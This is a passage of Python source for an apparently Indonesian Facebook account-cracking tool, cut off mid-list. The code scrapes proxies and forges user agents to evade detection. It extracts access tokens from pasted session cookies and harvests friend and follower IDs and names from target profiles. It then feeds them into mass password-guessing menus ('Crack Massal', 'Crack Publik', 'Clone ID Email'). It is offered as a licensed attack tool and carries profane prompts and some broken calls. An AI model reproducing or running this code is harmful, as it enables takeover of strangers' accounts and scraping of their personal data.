#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.console import Console
from rich.panel import Panel
from rich.style import Style
from rich import print
import requests
import geocoder
from rich.console import Console
import requests
from datetime import datetime
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests ipinfo ')
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKontolodon')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
	rr = random.randint; rc = random.choice
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	t=random.randrange(0,10525)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	crot=random.choice(['Win64; x64','WOW64'])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
	hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
	ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#WARNA PRINT IMPORT RICH#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
asu = random.choice([m,k,h,u,b])
import datetime

#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1': 'Januari', '2': 'Februari', '3': 'Maret', '4': 'April', '5': 'Mei', '6': 'Juni', '7': 'Juli', '8': 'Agustus', '9': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
dic2 = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ WAKTU ]--------------#
import datetime
def waktu():
    now = datetime.datetime.now()
    hours = now.hour

    if 4 <= hours < 12:
        timenow = "[bold yellow]Selamat Pagi 👋"
    elif 12 <= hours < 15:
        timenow = "[bold green]Selamat Siang 👋"
    elif 15 <= hours < 18:
        timenow = "[bold orange3]Selamat Sore 👋"
    else:
        timenow = "[bold blue]Selamat Malam 👋"

    return timenow

# Memanggil fungsi
pesan_selamat = waktu()

# Menentukan lebar layar secara dinamis
lebar_layar = 80

# Menghitung jumlah spasi di awal untuk menengahkan pesan
spasi_awal = (lebar_layar - len(pesan_selamat)) // 2
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
def back():
    login_menu()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.02)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
        time.sleep(0.02)

# ------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    print(nel(f"""{asu}               
           ██████╗ ██████╗  ██████╗ ███████╗
           ██╔══██╗██╔══██╗██╔═████╗╚════██║
           ██████╔╝██████╔╝██║██╔██║    ██╔╝
           ██╔══██╗██╔══██╗████╔╝██║   ██╔╝ 
           ██║  ██║██║  ██║╚██████╔╝   ██║  
            ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝                                      
             """,width=90, padding=(0, 8), title=f"\r", style=f"bold purple"))
#--------------------[ AUTHOR ]--------------#
def author():
     print(nel(f'\t\t          [bold blue]Info Author', style=f"bold purple"))
     print(f"  {H2}╰─▶{B2} ✶ [bold yellow] Author:[bold green]Khoirul-Xd")
     print(f"  {H2}╰─▶{B2} ✶ [bold yellow] Status:[bold green]Premium bpk lo")
     print(f"  {H2}╰─▶{B2} ✶ [bold yellow] GitHub:{B2}https://github.com/khoirulez")

#--------------------[ TUMBAL ]--------------#
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\nINVALID DANCOK.{P}')
		time.sleep(2)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		id = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{p}>>> Perbaiki Towermu Kawan")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		clear();login()
		banner()
		print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
	print(nel(f"\t\t         [bold blue]Info Tumbal",style=f"bold purple"))
	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] User Tumbal:{H2}{nama}")
	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] ID Tumbal:{B2}{id}")
#--------------------[ USER ]--------------#
import requests
from datetime import datetime
from rich import print as rprint  # Jika Anda menggunakan modul rich untuk formatting

def info_user():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()

        alamat_ip = data.get('ip')
        region = data.get('region')
        lokasi = data.get('loc')
        kota = data.get('city')
        zona_waktu = data.get('timezone')

        # Menggunakan rprint dari modul rich untuk formatting
        rprint(nel(f'\t\t         [bold blue]Info User', style=f"bold purple"))
        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your IP:{B2}{alamat_ip}")
        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Region:[bold green]{region}")
        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Lokasi:{B2}{lokasi}")
        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Kota:[bold green]{kota}")
        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Zona Waktu:[bold green]{zona_waktu}")

    except Exception as e:
        print(f"Error: {e}")

#--------------------[ BAGIAN-TAHUN ]--------------#
thnb = 'tahun(fx)'
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['61550']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#--------------------[ BAGIAN-MASUK V1 ]--------------#
def pepek():
    loading()
    os.system("clear")
    banner()
    print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
    print(nel(f'\t\t           [bold blue]Login Licensi', style=f"bold purple"))
    print(' [bold green]╰─▶[bold blue] 1[bold yellow] Login Ke Tools')
    print(' [bold green]╰─▶[bold blue] 2[bold yellow] Hubungi Admin')
    pil = input(f'✶ ━━⫸ {H} Choice{N} : ')
    if pil in['2','02']:
        jalan("\n [•] {H2}You will be redirected to the Author Whatsapp...")
        time.sleep(0.03)
        loading()
        time.sleep(0.03)
        os.system('xdg-open https://wa.me/6281283547452?text=Hallo+min+minta+lisensi+trial+SC+ini')
        time.sleep(3)
        pepek()
    elif pil in['1','01']:
        jalan(f"{H}Pastikan sudah memiliki licensinya")
        loading()
        clear()
        run()
    else:
        print(f'{M2}  Pilih Yang Bener Asu ');time.sleep(0.03);pepek()
#--------------------[ BAGIAN-MASUK ]--------------#
import os
import requests
import json
import random
import re
import time

def login():
    banner()
    print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku = []
        tokenku.append(token)
        try:
            response = requests.get('https://graph.facebook.com/me?fields=name,id&access_token=%s' % (token), Kues={'Kue':cok})
            sy2 = json.loads(response.text)['name']
            sy3 = json.loads(response.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style='red')  # Assuming mark is a function you have defined
            sol().print(lo, style='cyan')  # Assuming sol() is a function you have defined
            exit()
    except IOError:
        login_lagi334()

def login_lagi334():
    banner()
    print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
    try:
        os.system('clear')
        banner()
        asu = random.choice(["m", "k", "h", "b", "u"])
        cookie = input(f'  [{h}•{x}]{U} Masukkan Cookies{x} :{h} ')
        data = requests.get("https://business.facebook.com/business_locations", headers={
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1; Elephone P4000 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/62.0.3202.66 Mobile Safari/537.36",
            "referer": "https://x.facebook.com/",
            "host": "business.facebook.com",
            "origin": "https://business.facebook.com",
            "upgrade-insecure-requests": "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type": "text/html; charset=utf-8"
        }, cookies={"cookie": cookie})
        find_token = re.search("(EAAG\w+)", data.text)
        ken = open(".token.txt", "w").write(find_token.group(1))
        cok = open(".cok.txt", "w").write(cookie)
        print(f'  [•]{H2} LOGIN BERHASIL!!!! ')
        time.sleep(0.02)
        loading()
        clear()
        login_menu()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NJING !!%s' % (x, k, x, m, x))
        exit()
#------------------[ BAGIAN LOGIN ]----------------#
def login_menu():
    banner()
    print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
    try:
       loading()
       clear()
       banner()
       print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
       token = open('.token.txt','r').read()
       cok = open('.cok.txt','r').read()
       print(f'  [•][bold green] LOGIN BERHASIL!!!! ')
       time.sleep(2)
       loading()
       clear()
    except IOError:
       print(' {h} Cookies Expired, login ulang kontol!!!')
       time.sleep(2)
       loading()
       clear()
       login_lagi334()
    banner()
    print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
    author()
    menu()
    info_user()
    print(nel(f'\t\t         [bold blue]Menu Tools Crack', style=f"bold purple"))
    prints(f"""             {H2}╰─▶ {B2}01 [bold purple]Crack Massal    {H2}╰─▶ {B2}04 [bold purple]Cek Ressult
             {H2}╰─▶ {B2}02 [bold purple]Crack Publik    {H2}╰─▶ {B2}05 [bold purple]Crack File
             {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
    ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
    if ___Sllowly_ID____ in ['1']:
        massal()
    elif ___Sllowly_ID____ in ['2']:
        print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
        idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
        dump(idt,"",{"cookie":cok},token)
        setting()
    elif ___Sllowly_ID____ in ['3']:
	    mail2()
    elif ___Sllowly_ID____ in ['4']:
	    result()
    elif ___Sllowly_ID____ in ['5']:
	    crack_file()
    elif ___Sllowly_ID____ in ['0']:
	    os.system('rm -rf .token.txt')
	    os.system('rm -rf .Kue.txt')
	    print('>> [green] Sukses Logout+Hapus Kukis ')
	    exit()
    else:
	    print('>> {m} Pilih Yang Bener Asu ')
	    back()
def error():
	print(f'{k}>> {m}Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-------------------[PUBLIK]--------------------#    
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> {M}sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###-----[ DUMP OTOMATIS ]-----###
def dump1(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-------------------[ CRACK-PUBLIK2 ]----------------#
def dump2():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input(f'✶ ━━⫸ {H2} ID Target{x} : ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print(' : {}'.format(len(id)));setting()
		except Exception as e:
			print(e)
#-------------------[ CRACK-PUBLIK3 ]----------------#
def dump3():
	print("")
	x=f"\t\t{P2}Target harus public & banyak friends nya"
	rprint(panel(x,style=f"bold purple"))
	x=f"\t\t{P2}ketik {H2}Me{P2} untuk crack dari pertemanan"
	rprint(panel(x,style=f"bold purple"))
	put = input(f" Target id public :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cok.txt','r').read()
		coki = {"cookie":cok}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
		#print(f" Mengambil ID Teman"+H+": "+nama["name"])
		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		#try:
			#Hikmat = link["data"]
			#ttl__ = []
			#ttl__.append("\033[96;1m + TTL")
		#except:
			#pass
		#if len(link["data"]) == 0:
			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
			#print(M+" [x] Coba cari Akun yg lainnya!")
			#exit()
		#global ttl__
		token = open('token.txt','r').read()
		cookie = open('cok.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#print(f" nama target :%s %s"(H,lk))
		x=f"{P2}Nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
		rprint(panel(x,style=f"bold purple"))
		setting()
	except requests.exceptions.ConnectionError:
		jalan(" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan(" gagal dump id... mungkin privat friends/gada friends nya") 
		login_menu()
#------------------[ CRACK-PUBLIK ]-----------------#
def dump4(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r'✶ ━━⫸ {H2}SUKSES MENGUMPULKAN{h} {len(id)}{P} ID{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-----------------[ CRACK EMAIL ]-----------------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['mulyana','mulyono','ramdani','ramdan','ramadhan','ramadhani','saputra','syahputra','wijaya','kusuma','irawan','wirawan','setiawan','setyawan','hamdani','dermawan','sulaeman','pasundan','gumilang','gumilar','saepuloh','setiadi','rusmana','lesmana','suparman','hermansah','suherman','wijayanto','saripudin','saepudin','firmansyah','hidayat','kurnia','kurniawan','ramadani','muhamad','alamsyah','maulana','aprilia','apriliani','yulianti','julianti','sumiati','rahayu','saluyu','maharani','mulyani','rusmini','aisyah','fatimah','lestari','mulyati','damayanti','pertiwi','handayani','azizah','apipah','aropah','nuraisah','nurlaila','nursafitri','nurcahaya','nurjanah','nurfatimah','rahmawati','rosmawati','larasti','purnama','nurohman','nurahman','adinda','sumarni','sukaesih','bintang','kirana','cahyani','nurarsyila','amanda','sulastri','septiani','kartina','karlina','nuraropah','isabela','safitri','mawarni','rofikah','nengsih','ningsih','yuningsih','yunengsih','suningsih','sunengsih','malaka','azzahra','larasati','pertiwi','pratiwi','asyifa','aminah','nasution','sitorus','sinaga','sihombing','simamora','saepuloh','susanto','santoso','nursuci','khoerunisa','fitriani','sutomo','khan','singh','hartono','ruhyadi','ardiansyah','hardiansyah','herdiansyah','sinaga','prasti','kejora','rokayah','supriadi','willyam','wibowo','armada','darmawan','badriah','sulistia','fadilah','natalia','handayani','rusmiati','nurahma,nursakila,salsabila','hungkul','sayang','gaming','utama','pertama','peratama','pratama']
